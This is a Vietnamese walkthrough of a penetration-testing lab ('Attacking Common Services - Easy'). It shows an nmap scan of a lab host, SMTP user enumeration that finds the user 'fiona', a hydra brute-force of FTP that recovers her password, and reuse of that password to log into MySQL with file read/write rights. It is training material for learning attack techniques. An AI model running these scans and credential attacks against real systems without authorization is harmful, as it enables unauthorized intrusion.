# Attacking Common Services - Easy

<img width="1508" height="781" alt="image" src="https://github.com/user-attachments/assets/d6b6200c-e7ba-4893-a97b-1c46fcdfe49e" />

Đối tượng là `10.129.203.7`, tôi chạy lệnh nmap để scan các port:
```
sudo nmap 10.129.203.7 -Pn -sV -sC -p- --min-rate=200 -T 4 -oN mediumlab -v
```

Và kết quả nhuw sau:
```
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp
| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
| Issuer: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: shaWithRSAEncryption
| Not valid before: 2022-04-21T19:27:17
| Not valid after:  2032-04-18T19:27:17
| MD5:     27ed 2da8 8b25 57e3 d2fc c0c8 9f0b 55b0
| SHA-1:   5018 d8d5 ba6b 5a1c 8df6 5969 45d7 fe06 3d32 7fad
|_SHA-256: 9412 24b0 f661 ef53 da56 d22c bc3a 15d7 7477 5121 53aa 4360 8390 1f4c a663 e23e
|_ssl-date: 2025-11-03T16:33:55+00:00; +2s from scanner time.
| fingerprint-strings: 
|   GenericLines: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|     Command unknown, not supported or not allowed...
|     Command unknown, not supported or not allowed...
|   NULL, SMBProgNeg: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|   SSLSessionReq: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|_    Command unknown, not supported or not allowed...
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Welcome to XAMPP
|_Requested resource was http://inlanefreight.htb/dashboard/
|_http-favicon: Unknown favicon MD5: 56F7C04657931F2D0B79371B2D6E9820
443/tcp  open  ssl/https     Core FTP HTTPS Server
|_ssl-date: 2025-11-03T16:33:53+00:00; +2s from scanner time.
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date:Mon, 03 Oct 2025 16:33:14 GMT
|     Server: Core FTP HTTPS Server
|     Connection: close
|     WWW-Authenticate: Basic realm="Restricted Area"
|     Content-Type: text/html
|     Content-length: 61
|     <BODY>
|     <HTML>
|     HTTP/1.1 401 Unauthorized
|     </BODY>
|     </HTML>
|   GenericLines, HTTPOptions, RTSPRequest: 
|     Command Not Recognized
|   GetRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date:Mon, 03 Oct 2025 16:33:10 GMT
|     Server: Core FTP HTTPS Server
|     Connection: close
|     WWW-Authenticate: Basic realm="Restricted Area"
|     Content-Type: text/html
|     Content-length: 61
|     <BODY>
|     <HTML>
|     HTTP/1.1 401 Unauthorized
|     </BODY>
|_    </HTML>
|_http-server-header: Core FTP HTTPS Server
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
| Issuer: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: shaWithRSAEncryption
| Not valid before: 2022-04-21T19:27:17
| Not valid after:  2032-04-18T19:27:17
| MD5:     27ed 2da8 8b25 57e3 d2fc c0c8 9f0b 55b0
| SHA-1:   5018 d8d5 ba6b 5a1c 8df6 5969 45d7 fe06 3d32 7fad
|_SHA-256: 9412 24b0 f661 ef53 da56 d22c bc3a 15d7 7477 5121 53aa 4360 8390 1f4c a663 e23e
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
3306/tcp open  mysql         MariaDB 5.5.5-10.4.24
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.24-MariaDB
|   Thread ID: 11
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, ConnectWithDatabase, SupportsCompression, IgnoreSpaceBeforeParenthesis, InteractiveClient, IgnoreSigpipes, DontAllowDatabaseTableColumn, SupportsTransactions, SupportsLoadDataLocal, Speaks41ProtocolNew, ODBCClient, FoundRows, LongColumnFlag, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: QI[o="1lN#^612EFmu&W
|_  Auth Plugin Name: mysql_native_password
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-EASY
|   NetBIOS_Domain_Name: WIN-EASY
|   NetBIOS_Computer_Name: WIN-EASY
|   DNS_Domain_Name: WIN-EASY
|   DNS_Computer_Name: WIN-EASY
```

Tóm tắt lại thì gồm có các dịch vụ là ftp, smtp, http, mysql, rdp

Tôi dùng lệnh

```
smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.7
```

Để tìm user có trên server và ra được `fiona` 

```
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... users.list
Target count ............. 1
Username count ........... 79
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Thu Mar 20 18:47:26 2025 #########
10.129.24.232: fiona@inlanefreight.htb exists
######## Scan completed at Thu Mar 20 18:47:28 2025 #########
1 results.

79 queries in 2 seconds (50.5 queries / sec)
```

Tiếp theo đó là tôi dùng hydra để crack password 

```
hydra -l "fiona" -P ~/wordlist/rockyout.txt -f ftp://10.129.203.7
```

Và tìm được password là:

```
[21][ftp] host: 10.129.203.7   login: fiona   password: 987654321
```

Dùng password này thử đăng nhập các dịch vụ khác và đăng nhập được mysql và không tìm được gì nhiều lắm:

<img width="1921" height="832" alt="image" src="https://github.com/user-attachments/assets/10bee0da-1d51-4edc-bb6d-0e5149b0a3bd" />

Quên mất là khi truy cập thông qua trình duyệt thì là xampp:

<img width="1546" height="973" alt="image" src="https://github.com/user-attachments/assets/c7aed0a8-6f82-4917-bcf4-9c6ba03ddedf" />

Tiếp tục với sql thì tôi thấy nó có quyền đọc và ghi file:

<img width="931" height="274" alt="image" src="https://github.com/user-attachments/assets/6cc366eb-9a05-4643-a1a2-59277f256c64" />

<img width="1007" height="322" alt="image" src="https://github.com/user-attachments/assets/39f6b401-3600-4a9f-badb-978eb2dc0dd8" />

<img width="1019" height="184" alt="image" src="https://github.com/user-attachments/assets/156ddcdc-46eb-4015-8046-20450b3e097e" />


